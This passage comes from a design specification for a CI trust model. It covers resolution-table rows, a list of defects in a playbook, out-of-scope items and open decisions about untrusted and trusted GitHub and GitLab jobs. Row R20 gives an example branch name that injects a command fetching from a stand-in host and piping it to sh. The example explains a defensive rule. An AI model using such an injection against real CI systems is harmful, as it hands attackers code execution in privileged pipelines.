| R5 | `dist_hash` is "the SHA-256 of the release's artifact list — a file the release publishes naming every platform artifact and the wheel with its own SHA-256" (PB §6.7). No location, no name, no format. | Content-addressed layout `<base>/<dist_hash>/artifacts.txt`; `sha256sum` bytes, two spaces, LF, sorted ascending by artifact name, no header; artifact names `spine-<version>-<target>.tar.gz`. The base is `SPINE_DIST_BASE`, defaulting to a value the release bakes. | Keying the directory on the list's own digest is what lets `ci.sh` fetch the list before it knows the version, and it makes one 64-hex string locate *and* authenticate everything. The sort is required or two builds of one release produce two `dist_hash` values. The **host** is the owner's and is left as OPEN-1 rather than invented. |
| R6 | "The probe is the untrusted job itself: it fails the run if the pipeline-key variable is visible to it" (PB §7.4 rule 0). | `ci.sh` refuses — exit 2, before any fetch — when `SPINE_PIPELINE_KEY`, `SPINE_PUSH_KEY` or `SPINE_PUSH_TOKEN` is **set**, empty included. It **does not strip** them; the collector separately measures RF §4.2's wider predicate into `keys_visible=`. | Stripping would launder a misconfigured pipeline into a passing assertion, which is the opposite of what rule 0 asks for. Refusing before the fetch is what keeps candidate code out of a job that can see the key. The two-party split is forced: the collector's field must be *measured over every runner invocation*, and `ci.sh` must refuse *before* the collector exists. |
| R7 | PB §7.4 rule 3: "`H` is the ref the run names". PB §11's CLI gives `--collect` no argument that could name one. | `H` is `git symbolic-ref HEAD`; `ci.sh` refuses unless HEAD is on the candidate branch it was given, and a detached HEAD is a refusal. | It is the only reading under which the CLI PB §11 fixes can express the operation PB §7.4 requires. Refusing rather than checking out is deliberate: `ci.sh` must not mutate the workspace, and making the definition put HEAD in the right place makes the obligation visible. §15 D9. |
| R8 | RF §3 fixes the path as `.spine/cache/results/<T>.jsonl` and says the profile decides where the *directory* lives; nothing says relative to what. | Relative to `git rev-parse --show-toplevel` of the repository `ci.sh` was invoked in, whatever detached checkouts the collector makes elsewhere. | RF §3 already forbids the result directory from being inside the detached checkout of `T` under `profile=uid`, and RF §11's "preserving that exact relative path" is meaningless without a root. The invoking repository is the only root both jobs can name. |
| R9 | RF §8.1: the artifact "contains exactly one regular file, at exactly `.spine/cache/results/<T>.jsonl` … Extra entries, **directories**, symlinks, absolute paths and `..` components make it not-a-result." | Read as the path at which the trusted stage **materializes** it. The one-entry, no-symlink, no-`..` rule is enforced over the materialized tree; the transport container's internal naming is the provider's. | Taken as a rule about bytes inside the container it is self-contradicting — a file at a nested path implies directory entries — and unimplementable on GitHub, whose artifact action roots at the least common ancestor of what it matches. The materialization reading satisfies every purpose RF §8.1 states: one file, that path, nothing else, and no traversal. §7.2 stages through a dot-free directory to make it exact. |
| R10 | "a trunk-scoped event (`workflow_run` of trunk's own untrusted workflow …)" (PB §7.4 rule 0). Which events those are is not enumerated. | On GitHub: the untrusted job is `pull_request_target` (definition from the base branch) and the trusted job is `workflow_run` (definition from the default branch). Push, `pull_request` and `merge_group` are refused. | These are the two events for which GitHub takes the definition from a branch the candidate does not control. It makes rule 0 a structural property rather than a check — and where a provider offers no such event, §8.1's third conjunct is what carries the consequence instead. |
| R11 | Nothing says how the trusted job knows the run that triggered it was trunk's untrusted job. | Three clauses in the job's `if:`: `workflow_run.event == 'pull_request_target'`, `workflow_run.path == '.github/workflows/spine-collect.yml'`, `workflow_run.head_repository.full_name == github.repository`. | `workflow_run` matches the triggering workflow **by `name:`**, so a candidate may add a push-triggered workflow named `spine-collect` and reach this job from its own file. Two of the three clauses are the guarantee, not defence in depth. Without them, GitHub's arrangement is no better than GitLab's. |
| R12 | PB §5.4 offers GitHub merge queue and GitLab merge trains as configuration (a)'s answer to starvation — since v0.19 with the qualifier *"The queue serializes; it never creates the trunk commit — the trusted job still performs the CAS, or precondition 4 fails and the arrangement is configuration (b) whatever it is called"*. | They are configuration **(b)**. A queue that creates the trunk commit fails precondition 4 by PB §7.4 rule 5's own words. The shipped definitions use no queue. | Rule 5 precondition 4 is explicit — "a queue that creates the trunk commit itself is configuration (b) whatever it is called" — and GitHub's merge queue does exactly that. Filed as §15 D4 when the two sentences could not both be true; PB §5.4 has since said the same in its own words, so the contradiction is closed and this resolution stands unchanged. §15 D4. |
| R13 | Nothing relates `params.trunk` to the provider's default branch. | On GitHub they must be equal, and `init --ci github` refuses otherwise. | `workflow_run` takes its definition from the **default** branch and runs on it, and an environment's deployment-branch rule is evaluated against the ref the job runs on. Where trunk is not the default branch, the trusted job runs a file spine does not control and the environment rule guards the wrong ref — two of rule 0's four requirements, silently lost. §15 D6. |
| R14 | PB §7.4 rule 0 through v0.19: "a result file from a job that was not [triggered from trunk's definition] is never ingestible", with no test the trusted stage can perform. Rule 0 now states the resolution instead — such a file *"is still **ingested** — it simply fails auto-merge precondition 2"* — and calls the older sentence "the strict reading". | Ingest, and fail **auto-merge precondition 2**, which gains a third conjunct: the run must have established that the file came from a trunk-defined untrusted job. GitHub establishes it (R11); GitLab-in-repository and `generic` never do. | Taken literally, "never ingestible" means no landing at all on any provider that offers no such evidence, so GitLab and `generic` could never land — the toolkit would run on one provider. Precondition 2 is where rule 0's assertion already lives ("A run whose ingested header lacks either … fails precondition 2"), so narrowing it is fail-closed, in-schema for GR §5.8, and strictly weaker than rule 0 while strictly stronger than ignoring the gap. RF §8.4's *iff* needs the third conjunct added. §15 D3. |
| R15 | PB §11's CLI gives `--land [<id> \| --quick <branch> \| --reseal]`; PB §5.5 puts reseal reviews on `refs/heads/quick/reseal-<O>`. | §6.4's table, with `quick/reseal-*` tested **before** `quick/*`. | A reseal ref *is* a `quick/*` ref, so a first-match router lands it as an ordinary quick change: wrong `Spine-Event`, wrong review rule, wrong `base=`. §15 D22. |
| R16 | GR §4.4.2 fixes the note's bytes and says it happens after the CAS; nothing says who runs the commands or what a failure costs the job. | `spine check --ci --land` publishes, as its last action after step 6. Failure is exit 5: the job fails, the landing stands. | The report's bytes are spine's; a definition that assembled a note would be a second serializer of a digest. The landing cannot be retracted (PB §5.4), and a rule that tried would make the audit trail's transport an input to the ledger's validity — the thing PB §7.4 rule 4 spends a paragraph denying. |
| R17 | Nothing says where the canonical report bytes go during a run. | `.spine/cache/report.json` under `--ci`, overwritten per run, uploaded `if: always()` by the definition. | GR §4.4.4: without the report's **attested** members — `evidence`, `run.reverifications`, preconditions 2 and 4, and the G1, G7 and G8 statuses — no candidate can ever be assembled that hashes to `report=`, and re-running the pipeline produces a different digest no seal names. A failed note push with no artifact is a permanently unverifiable landing. §15 D8. |
| R18 | PB §11 names `SPINE_PIPELINE_KEY` and says nothing about its contents or about the principal. | Key **material**, read from the environment, never written to disk. The principal is selected from `spine-seal@v1` in the keyring at `base` by matching the public key; zero or several matches is a refusal. | Naming the principal in a second variable would let a misconfigured job sign under an identity the keyring does not grant, which is precisely the "a signature proves identity; authority is a policy question" line PB §7 opens with. Selecting it from the keyring makes the authority read from trunk like every other policy. |
| R19 | PB §7.4 rule 0 requires a bypass principal "only the trusted job holds, never the Actions token both jobs share", and PB §11 lists two CI variables. | `SPINE_PUSH_TOKEN`, or `SPINE_PUSH_KEY` where HTTPS credentials are unavailable; exactly one set. §11's list is incomplete and the amendment is reported, not made. | Rule 0 requires a third credential in so many words. Leaving it unnamed means each implementation invents a name, and a variable the untrusted job must be checked against cannot be checked against a name nobody fixed — `ci.sh`'s probe needs the literal string. §15 D15. |
| R20 | Nothing in the playbook mentions CI templating languages. | **No candidate-controlled value is interpolated into a `run:` script.** Every one crosses into shell as an `env:` binding. | GitHub substitutes `${{ }}` into the script *text* before any shell sees it, and the candidate names its own branch. A branch called `` a";curl evil\|sh;" `` in a `run:` block is code executing in the untrusted job — which is bounded — and, through `workflow_run.head_branch`, in the **trusted** job, which is not. This is the one place a CI definition can hand a candidate the trusted stage. |
| R21 | "the allowlist lives in `.spine/ci.sh`, a floor path" (PB §7.1). | `ci.sh` **declares** `SPINE_ALLOWED_HOSTS` and configures the clients that honour a proxy; the isolation boundary **enforces**. Since 2026-08-27 it does: RF §7.1's M1 creates a network namespace, every runner invocation is loopback-only, restore is a collector phase from trunk's `.spine/restore.sh`, and **P4** must pass before `profile=container` is written (§5.6, §6.1 U8, RF §13 R34). Enforced is *when*, not *which hosts*: narrowing the restore phase to the list is still the host's socket filter. SwiftPM is named as having no environment knob, its mirrors being frozen under `C-T2` instead; Gradle was named alongside it until 2026-08-27 and is gone with Kotlin, along with the two Maven/Gradle hosts the allowlist used to grant (§5.6). | A POSIX shell script cannot filter a socket, and a spec that implied otherwise would describe a control nobody implements. Stating the split is what makes the floor protection meaningful: the *declaration* is reviewed, the enforcement is the profile's, and it is now a test the collector can fail rather than a promise. §15 D10. |
| R22 | PB §7.4 rule 0 wants the untrusted job to fail when the probe fails; RF §7.3 has the collector exit non-zero on any status but `complete` while still writing an honest file. | The artifact is uploaded `if: always()`; the job's failure is a later step. `ci.sh` exit 1 (a file exists) and exit 2 (none) is the distinction the definition acts on. | A red suite must reach G1 as evidence, not vanish with a failed job. RF §7.3 says it: "a failed job that produced no file and a failed job that produced an honest one are different things, and the trusted stage should be able to say which." |
| R23 | PB §7.4 rule 0 speaks of jobs that run "on `intent/*`, `quick/*` and `spine/upgrade-*` **pushes**", while the only trunk-defined GitHub trigger for a branch is a pull-request event. | On GitHub a candidate needs an open PR against trunk as its event source. `spine new` does not open it and `init --ci github` prints the obligation. | Spine ships no provider API client and no mandatory API key (PB §1.1), so opening a PR is a human's or an agent's act. The alternative — a push-triggered dispatcher chained by `workflow_run` — rests on a provider behaviour this document could not verify, and is OPEN-2 rather than a specification. |
| R24 | PB §11 named one GitHub workflow file through v0.19; it now names *"**two** workflow files, `.github/workflows/spine-collect.yml` (untrusted) and `.github/workflows/spine-land.yml` (trusted)"*, which is this resolution adopted. | Two: `spine-collect.yml` and `spine-land.yml`. | `workflow_run` selects by `name:`, so one self-naming file fires on its own completion and every trusted run triggers another. §15 D2. |
| R25 | PB §7.4 rule 0 gives GitLab's trusted job as "a schedule that polls for candidates or a trigger scoped to that ref", and never says how a schedule learns which candidate to land. | §8.4's four-step discovery: fetch the three candidate ref globs, sort ascending by bytes, take the first with a `merge_request_event` pipeline for that tip carrying a `spine-collect` artifact. | PB §5.4 step 1 requires `H` to be named, and a schedule names nothing. The byte sort is an ordering and not a priority — the CAS decides, and an unattempted candidate is attempted next run — which keeps the choice deterministic without inventing a queue. §15 D25. |
| R26 | PB §7.5 makes `SPINE_TRUST_ROOT` a requirement of `spine check --ci`; PB §7.1 gives the untrusted stage no variables at all. | Both jobs read it. It is a **variable**, never a secret, and `ci.sh` refuses `collect` without it. | `--collect` runs under `--ci` (PB §11 CLI), so the refusal reaches the untrusted job. A trust root is a public commit id; treating it as a secret would put it in the environment rule that must exclude the untrusted job. §15 D13. |
| R27 | Nothing says whether landings may run concurrently. | One trusted run at a time: GitHub `concurrency: spine-land` with `cancel-in-progress: false`, GitLab `resource_group: spine-land`. Untrusted runs are unbounded and `cancel-in-progress: true` per candidate. | Serialising is not a correctness control — the CAS is, and PB §5.4 is emphatic that "the loser's record is garbage by construction, not by policy". It reduces wasted work and makes the `refs/notes/spine` race rare. Cancelling an in-flight *trusted* run is refused: an interruption between the CAS and the note push is exit 5's case with nobody to see it. |
| R28 | GitLab's trusted job is scheduled, and PB §7.5 says "one clock, no timestamps". | A schedule is an event source. Nothing in the report, the envelope or the ledger is a function of when it fired. | Exactly GR §4.4.3's argument about the notes commit's own date, applied to the trigger: the constraint forbids deriving facts from a clock, not being started by one. Every fact a scheduled run records comes from git objects and the result file. |

## 15. Defects found in PLAYBOOK.md v0.19

Reported here rather than repaired, per `docs/spec/README.md`. **Citations are section anchors plus a verbatim quote, never line numbers**: a line number rots as the playbook grows, a section and a quote do not. Every entry is marked **CLOSED** or **OPEN** against `PLAYBOOK.md` as it now stands.

**D1 · CLOSED by PLAYBOOK.md v0.19 · The manifest had no `ci-gitlab` template though `--ci gitlab` existed** (PB §6.7's `templates` map; PB §11's CLI, *"`--ci github|gitlab|generic`"*). As filed: `templates` listed `"ci-github": 4, "ci-generic": 4`; PB §11's CLI offers `--ci github|gitlab|generic` and PB §11's *Files and refs* offers "a `.gitlab-ci.yml` snippet". A repository initialised `--ci gitlab` had files with no template row, which G16 checked against nothing. PB §6.7's map now carries **twelve** keys, `ci-gitlab` among them, and `manifest.md` §3.6 fixes the set; §3.1 here spells the GitHub pair `ci-github-collect` and `ci-github-land` rather than the single `ci-github@N` this document carried through v0.19.

**D2 · CLOSED by PLAYBOOK.md v0.19 · One GitHub workflow file cannot carry both jobs** (PB §11 *Files and refs*). As filed: `workflow_run` selects the triggering workflow by its `name:`; a single file listed as trunk's untrusted *and* trusted workflow fires on its own completion, and every trusted run triggers another that the `if:` skips and that completes and triggers a third. PB §11 named `.github/workflows/spine.yml`, singular. PB §6.7's `files[]` now carries `.github/workflows/spine-collect.yml` and `.github/workflows/spine-land.yml` as two records with two templates, which is the recommendation taken in full.

**D3 · CLOSED by the owner and by PLAYBOOK.md v0.19; the record is kept.** As filed: *"a result file from a job that was not [triggered from trunk's definition] is never ingestible"* named no test the trusted stage can perform, and read literally no GitLab or generic repository could ever land. On GitLab the top-level `.gitlab-ci.yml` in an MR pipeline is the candidate's, and no API reports which configuration a pipeline was assembled from; on `generic` spine wrote nothing and can check nothing. An implementer following the sentence refused every file on both providers; one ignoring it accepted a forgeable one. §14 R14 resolved it into precondition 2 and reported it. **The owner settled it that way on 2026-08-26**, and PB §7.4 rule 0 now reads that such a file *"is still **ingested** — it simply fails auto-merge precondition 2"*, with precondition 2 stating **three conjuncts, not two**. `result-file.md` §8.1/§8.4 and `gate-report.md` §5.8/§9.25 are written to the same reading, and §8.1 and §14 R14 here need no change: the recommendation this defect made — that the requirement is an *arrangement* property, verified per run where the provider exposes evidence and failing precondition 2 where it does not — is exactly what shipped.

**D4 · CLOSED · Merge queues were offered as configuration (a) and defined as configuration (b), in the same document** (PB §5.4 against PB §7.4 rule 5 precondition 4). **As filed:** PB §5.4 read *"GitHub merge queue and GitLab merge trains … may be the runner here and are the answer to starvation"* while PB §7.4 rule 5 precondition 4 read *"a queue that creates the trunk commit itself is configuration (b) whatever it is called"*, and GitHub's merge queue creates the trunk commit — both sentences could not hold. The recommendation was that §5.4 make a queue available as (a)'s runner only where it serialises without merging. **Taken:** PB §5.4 now continues *"The queue serializes; it never creates the trunk commit — the trusted job still performs the CAS, or precondition 4 fails and the arrangement is configuration (b) whatever it is called (§7.4 rule 5)"*, and PB §7.4 rule 0 says the same from the other side. §14 R12's resolution is unchanged: the shipped definitions use no queue.

**D5 · CLOSED · Rule 0 put the untrusted job on `merge_group`, whose definition is the candidate's** (PB §7.4 rule 0). **As filed:** the same sentence banned `merge_group` for the trusted job because it *"executes the merge group's own workflow file on a `gh-readonly-queue/*` ref"*, then said the untrusted job runs on `merge_group` under a merge queue. The merge group's content is trunk merged with the candidate, so a candidate that edits the workflow edits the definition that collects its results — exactly what rule 0's first clause forbids. **Taken:** rule 0 now says *"**never `merge_group` for the untrusted job either**"*, and gives that reason in its own words — *"the job that calls the collector would be defined by the branch under test and could simply not call it, which is the hole rule 0 exists to close"*.

**D6 · OPEN · Nothing requires `params.trunk` to equal the provider's default branch** (PB §7.3, *"`params.trunk` is a rendering hint"*; PB §7.4 rule 0). §7.3 calls `params.trunk` "a rendering hint", and rule 0 puts the trusted job on `workflow_run` in an environment whose deployment rule is "the trunk only". On GitHub a `workflow_run` workflow's definition comes from the **default** branch and the job runs on it, so where trunk is not the default branch the trusted job runs a file spine does not control and the environment rule guards a different ref. Two of rule 0's four requirements are lost without a word being wrong. Recommended: rule 0 require the equality, and `init --ci github` refuse otherwise.

**D7 · OPEN · `dist_hash` names an artifact list with no location, no name and no format** (PB §6.7, *"`dist_hash` is the SHA-256 of the release's *artifact list*"*). *"the SHA-256 of the release's artifact list — a file the release publishes naming every platform artifact and the wheel with its own SHA-256."* Two implementations of `.spine/ci.sh` cannot fetch the same file, and without a byte-level format two builds of one release compute two `dist_hash` values. This is the pin the whole trusted-execution argument rests on. §5.5 fixes it. Recommended: adopt §5.5, or name another location and format in §6.7.

**D8 · CLOSED · §11's `.spine/cache/` list had no slot for the gate report** (PB §11 *Files and refs*). **As filed:** the cache was enumerated as `graph.sqlite`, `staging/` and `results/<T>.jsonl`. The report's **attested** members exist nowhere else once a run ends (GR §4.4.4), so a landing whose note push fails and whose run kept no copy is permanently unverifiable by anyone; the recommendation was to add `report.json`. **Taken:** PB §11 now enumerates the cache as *"`graph.sqlite`, `staging/`, `report.json` — the canonical gate report every `--land --ci` writes — and `results/<T>.jsonl`"*, and PB §11's CLI adds *"`--land --ci` **always** writes the canonical gate report to `.spine/cache/report.json`"*. §14 R17 is what this document does, and needs no change.

**D9 · OPEN · `spine check --ci --collect` has no way to name `H`** (PB §11's CLI). PB §7.4 rule 3 says "`H` is the ref the run names: `intent/<ID>`, `quick/<name>` or `spine/upgrade-<version>`", and PB §11's CLI gives `--collect` no argument. §14 R7 resolves it to `git symbolic-ref HEAD`, which is a real decision an implementer would otherwise make differently. Recommended: §11 state it, or give `--collect` a ref argument.

**D10 · CLOSED · A POSIX shell script cannot enforce a network allowlist** (PB §7.1's untrusted row, **as it read until 2026-08-27**). *"network only to an allow-listed registry proxy during dependency restore … (the allowlist lives in `.spine/ci.sh`, a floor path)."* **As filed:** `ci.sh` can declare hosts and set client environment variables; the filtering is the container's, the proxy's or the firewall's, and as written the sentence described a control nobody implemented. **Fixed on 2026-08-27, in both halves.** The *when* half is a control the collector performs and can fail — M1 creates a network namespace, every runner invocation is loopback-only, and P4 must pass before `profile=container` is written (RF §7.1). The *which hosts* half stays the host's socket filter, and **PB §7.1 was narrowed to say exactly that** rather than to keep promising it. §5.6, §6.1 U8, §14 R21, RF §13 R34.

**D11 · OPEN · The registry allowlist excludes the one fetch that has a hash to check** (PB §7.1's untrusted row against PB §7.4 rule 2). Rule 2 has `.spine/ci.sh` install and hash-verify the collector; §7.1 confines the untrusted stage's network to the dependency-restore phase and grants the runners none. The distribution host is not a registry proxy and the install is not a dependency restore, so a literal allowlist blocks the installer. Recommended: name the distribution root as a second, earlier grant, distinguished by the fact that its content is authenticated by a digest read from trunk.

**D12 · OPEN · The generic provider's own scaffold is promised and cannot be written** (PB §9's week-one list and its roadmap step 0; PB §11 *Files and refs*). PB §9 tells week one to *"set up the two-job CI skeleton (§7.4)"*; PB §9's roadmap step 0 says `init` writes *"the two-job CI snippet"* (this defect said §6.7 through v0.19 — the sentence is in §9, and the pointer is corrected here rather than the claim being dropped); PB §11 says generic's definition lives *"outside the repository"*. For `--ci generic`, `init` writes no definition and cannot, so the on-ramp §9 describes does not exist there. Recommended: PB §9's week-one list and its roadmap step 0 say that on `generic` `init` prints a contract instead of writing a snippet.

**D13 · OPEN · Where `SPINE_TRUST_ROOT` must be set is unstated, and the untrusted job needs it** (PB §7.5, *"`spine check --ci` refuses to run without one"*; PB §7.1's untrusted row; PB §9's week-one list). §7.5 says `spine check --ci` "refuses to run without one"; `--collect` runs under `--ci`; §7.1's untrusted row grants the stage no variables; §9 says only "set the trust-root variable in CI". An implementer who scopes it to the trusted job produces an untrusted job that refuses every run. Recommended: §7.5 say both jobs, and say it is a variable and not a secret.

**D14 · OPEN · Trunk's name is read from the candidate, or from nowhere** (PB §7.4 rule 1; PB §6.3's G15 row, *"a manifest naming another trunk fails"*). Rule 1 requires policy to be read from `origin/<trunk>`; G15 fails "a manifest naming another trunk". Neither says where the *name* comes from before any policy has been read, and the only in-repository source is the candidate's manifest. §14 R3 resolves it to out-of-band configuration. Recommended: rule 1 say that the trunk name is out-of-band, like the trust root and the pipeline key.

**D15 · OPEN · §11's CI-variable list is incomplete by rule 0's own requirement** (PB §11 *Files and refs*, *"the CI variables `SPINE_TRUST_ROOT` and `SPINE_PIPELINE_KEY`"*; PB §7.4 rule 0). §11 names `SPINE_TRUST_ROOT` and `SPINE_PIPELINE_KEY`. Rule 0 additionally requires a bypass principal "only the trusted job holds, never the Actions token both jobs share" — a third credential the untrusted job's probe must be able to check for by name, and which therefore needs a normative spelling. Recommended: add `SPINE_PUSH_TOKEN` and `SPINE_PUSH_KEY`, and `SPINE_DIST_BASE` with them.

**D16 · OPEN · `ci-generic` names the shell, not the provider, and the example is the only place that says so** (PB §6.7's manifest example, *"`{ "path": ".spine/ci.sh", "owner": "spine-owned", "template": "ci-generic@4"`"*). The manifest example gives `.spine/ci.sh` the template `ci-generic@4` in a repository whose `params.ci` is `"github"`. Read as "the template for `--ci generic`", a GitHub repository writes no `ci.sh` and nothing executes the collector. Recommended: rename the template `ci-shell`, or say in §6.7 that `ci-generic` is the provider-independent entry point every provider carries.

**D17 · OPEN · Three copies of one hash-verifying installer are implied where one floor file would do** (PB §7.4 rules 0 and 2). Rule 0 makes `.spine/ci.sh` the untrusted job's entry point; rule 2 requires the trusted stage to install and hash-verify the same release; nothing connects them, so each provider definition grows its own installer. §5.1's `install` mode is the resolution. Recommended: §7.4 rule 2 say that the trusted stage installs through the same trunk-read `ci.sh`.

**D18 · OPEN · A failed note push has no remedy and v1 has no command for one** (PB §7.4 rule 4, *"**The trusted stage publishes the full report to `refs/notes/spine`, and that is not optional.**"*; and GR §4.4.2). Publication is mandatory; `--land` refuses an id already sealed on trunk (§5.4 step 2), so re-running the job cannot republish; PB §11's CLI has no `--publish-note`. The report's attested members are gone with the run. Recommended: either a flag, or `--land` republishing idempotently when it meets an already-sealed landing whose note is missing and whose report it was handed. §18 OPEN-5.

**D19 · OPEN · §7.1's untrusted row and rule 0 disagree about who spawns the runner** (PB §7.1's untrusted row against PB §7.4 rules 0 and 3). PB §7.1: *"the candidate's build and tests, sandboxed — spawned by trunk's collector, which owns the result file (§7.4 rule 3)"*. Rule 0: `.spine/ci.sh` is what trunk executes, and rule 3 makes the collector `spine check --ci --collect`. Between them sits the untrusted job's own definition, which on every provider must at minimum fetch, check out and invoke — and on GitHub must also stage and upload. The "may execute" cell reads as though nothing else runs in that job. Recommended: §7.1 say "trunk's `ci.sh` and the collector it invokes", so that the definition's own steps are inside the model rather than beside it.

**D20 · OPEN · Rule 0's vocabulary is GitHub's, in a provider-neutral rule** (PB §7.4 rule 0, *"`permissions: contents: read`"*). `permissions: contents: read` is a GitHub Actions key. GitLab's equivalent — protected variables, protected branches, `CI_JOB_TOKEN` scope — is named only for the key variable, and no normative target exists for "no other secret" or for the read-only bound. A GitLab implementer has a sentence about a key they cannot set. Recommended: state the requirement abstractly (read-only repository access, no secret in the job's environment) and give the two providers' spellings as examples.

**D21 · OPEN · The untrusted job runs "on pushes" to candidate refs, and no trunk-defined GitHub trigger fires on a push** (PB §7.4 rule 0). Rule 0 says the untrusted job "is the only job that runs on `intent/*`, `quick/*` and `spine/upgrade-*` pushes" and, in the same sentence, that it is triggered by `pull_request_target` or a `workflow_run` dispatcher. `pull_request_target` requires an open pull request; a push-triggered dispatcher is the candidate's file. The consequence — a PR per candidate on GitHub — is a real cost the design never states. Recommended: say it, since it is the one piece of provider ceremony the design does not remove.

**D22 · OPEN · A reseal ref is a `quick/*` ref and nothing says to test it first** (PB §5.5, *"`refs/heads/quick/reseal-<O>`"*; PB §11's CLI). §5.5 puts reseal reviews on `refs/heads/quick/reseal-<O>`; §11's CLI has `--land --quick <branch>` and `--land --reseal`. A router matching `quick/*` first lands a reseal as an ordinary quick change: wrong `Spine-Event`, wrong `base=`, wrong review rule. Recommended: §5.5 or §11 fix the order, or move reseal branches out of `quick/*`.

**D23 · OPEN · The re-queue is assigned to "the snippet", which on `generic` does not exist** (PB §7.4 rule 3). *"A `base-moved` exit ends the run; the snippet re-queues the whole two-job run on the new `T`."* On `--ci generic` spine writes no snippet, and on GitLab's scheduled arrangement the re-queue is implicit in the next schedule rather than performed by anything. Recommended: say that re-queueing is the CI system's, bounded by nothing spine stores, and that its absence costs liveness and not correctness.

**D24 · OPEN · G10's scratch clone and the trusted job's disk budget are never related** (PB §5.4 step 5; PB §6.3's G10 row; PB §7.1's trusted row). Step 5 clones the repository twice per landing inside the trusted job, and §7.1's trusted row grants "git objects; policy from trunk" without mentioning that the job needs room for two more copies of the repository and a full index. §6.3 G10 argues at length that a repo too large to pay "should have to say that in its own words", but no CI-facing sentence tells an operator to size the job for it. Recommended: one clause in §7.4 rule 3 or §7.1.

**D25 · OPEN · GitLab's scheduled trusted job has no specified way to find a candidate** (PB §7.4 rule 0, *"a schedule that polls for candidates"*). *"a schedule that polls for candidates"*. §5.4 step 1 requires `H` to be named; a schedule names nothing, and nothing in the playbook defines discovery, ordering, or what happens when two candidates are ready. A GitLab implementation cannot be written from the text. §8.4 fixes it. Recommended: adopt §8.4, or drop the schedule and require a trigger.

## 16. Corrections owed to sibling specs — both adopted

Two, both consequences of §14 R14. **Both have been taken by their owners**, and the entries are kept as the record of what was asked and what landed; neither is outstanding.

**`result-file.md` §8.4, precondition 2 — adopted, and this entry is the record.** As filed against the two-conjunct form: *"**Precondition 2** holds iff `keys_visible=false` **and** §8.3 step 2 passed."* **It now reads with three**: *"Precondition 2 holds iff **all three** of: `keys_visible=false`; §8.3 step 2 passed; **and this run established trunk-defined origin evidence for the ingested file** (§8.1)"*, with its §13 R31 carrying the consequence that absent or disproved origin evidence fails that precondition and does nothing else at all. Without the third conjunct, a repository on `--ci generic` or on the in-repository GitLab arrangement could reach precondition 2 on a file whose every field a candidate wrote — which PB §7.4 rule 0 forbids in words the trusted stage has no way to enforce. The conjunct is a narrowing, so nothing that held before holds now and did not; it is fail-closed in the only direction available.

**`gate-report.md` §5.8, the precondition table — adopted, and this entry is the record.** As filed, its row for id 2 read *"`"met"` iff the ingested header's `keys_visible=` is `false` **and** the collector's `tool=` is the base's pin"*, marked **A**, and this document billed it for the third conjunct. **It now carries all three**: *"`"met"` iff **all three**: the ingested header's `keys_visible=` is `false`; the collector's `tool=` is the base's pin; **and this run established that the ingested file came from a job whose definition was taken from trunk**"*, with §5.8's following paragraph naming this document's §10.3 as the scorer and §14 R11 as GitHub's test. The marking is unaffected — the new conjunct is a fact about this run's own trigger, which is exactly what the **A** for `preconditions[4]` already records. No member of the schema changed and no digest moved for any landing on a provider where the conjunct already held, which is every GitHub landing.

**No amendment to `result-file.md` §8.1 is required.** §14 R9 reads its one-file rule as binding the path at which the trusted stage materializes the file, which is the reading under which every clause of it — one regular file, that path, no extra entries, no symlinks, no `..` — is both satisfiable and checkable. The sentence stands as written.

---

## 17. Out of scope

Deliberately absent, each for a stated reason:

- **The result file's format, vocabulary and ingestion order.** `RF`. This document fixes only how it crosses a provider boundary and where it is materialized.
- **The gate report's canonicalization, schema and digest, and what `--verify` can rebuild.** `GR`. This document fixes where publication happens in the job, what its failure costs, and that a copy is kept.
- **The `.spine/manifest.json` grammar.** `manifest.md`, the tenth spec, written after this one. §5.4 relies on exactly two members and on the fact that neither `cli`'s value can contain a `}` or a `"`; `manifest.md` §3.2 supplies that as a constraint — the file is canonical JCS, so `cli.version` and `cli.dist_hash` are strings whose contents §3.2 bounds — and §5's extractor still refuses ambiguity rather than guessing, which is now a belt-and-braces check rather than the only one. `manifest.md` §11 C4 and C5 ask this document for the closure.
- **Runner adapters, id grammars and import resolvers.** `IR`. No CI definition names a runner or a language; the invocation set is a function of trunk's `params.langs` and the pinned release (RF §6.2).
- **The release's build, signing and publication process.** This document fixes the *layout and bytes* an installer must find (§5.5), and the one build **input** the render depends on — the release manifest's location and schema (§3.4). How the artifacts are built, signed and published, and how the owner arrives at the four values §3.4 requires, are not here.
- **Which host serves the distribution root, and which commits the three actions are pinned at.** The *shape* they arrive in is §3.4's and is normative; the values are §18 OPEN-1 and OPEN-7.
- **Container images, runner labels, hardware, and how a `profile=container` boundary is actually created.** RF §3 and RF §7.1 (*The isolation boundary*) own the profile, and **RF's answer to the image half is that there is none**: the mechanism v1 ships builds the boundary out of namespaces over the job's own filesystem, pulls no image and names none, so there is nothing here for a definition to configure. A definition that names `ubuntu-latest` is illustrating, not specifying, and a repository that needs a different one changes a `spine-owned` file under a protected review like any other floor change.
- **Caching of dependencies, and what a restore script contains.** The trusted job restores none (PB §7.4 rule 3). The untrusted job may, and a poisoned cache is inside the same residual as a lying runner: it can affect `out` values and nothing else the trusted stage reads. `.spine/restore.sh` is the repository's file, not spine's — no template writes one, no `files[]` record names one, and RF §7.1 fixes only where its bytes come from, when it runs, what it runs under and that it contributes nothing to the result file. Fixing a restore *command* per language is refused for the reason RF §12 gives: three of the four v1 ecosystems have no single answer to it.
- **Provider-side branch protection, CODEOWNERS and required checks.** PB §7.3 makes them supplements "the guarantee does not depend on", and PB §11 makes two of them non-optional supplements rather than parts of the mechanism: non-fast-forward pushes denied on trunk and on `refs/heads/intent/*`, with intent-branch deletion restricted to the pipeline principal.
- **Notifications, dashboards, and anything that reports a run to a human beyond exit codes and the `spine review` packet.** PB §6.5.
- **Anything that persists between runs.** No cross-run counter, no record of a previous attempt, no list of past result files, no memory of which candidate was tried last. `C-M3` bounds re-verifications *within* one run in a counter the run holds in memory (PB §5.4, PB §12), and every discovery in §8.4 is recomputed from refs each time.
- **Windows CI.** §5.5, §18 OPEN-4.

## 18. OPEN — the owner's calls

**OPEN-1 · The distribution root — the value, and only the value.** §5.5 fixes the layout `<base>/<dist_hash>/artifacts.txt` and the list's bytes; §3.4 fixes where the root is carried (`release/release.json`'s `dist_base`), how it is spelled (`https://`, no userinfo, query or fragment, no trailing `/`) and what happens without it (`init` refuses the whole plan and renders no CI). The **host** is the owner's and is not invented here. Whichever host is chosen, two properties are load-bearing and should be stated in the release process: the path is content-addressed by the list's own SHA-256, and every artifact the list names is served from the same directory. **Until this is chosen no release manifest can be frozen and no binary renders a CI definition**, which is the intended failure and not a gap in the specification.

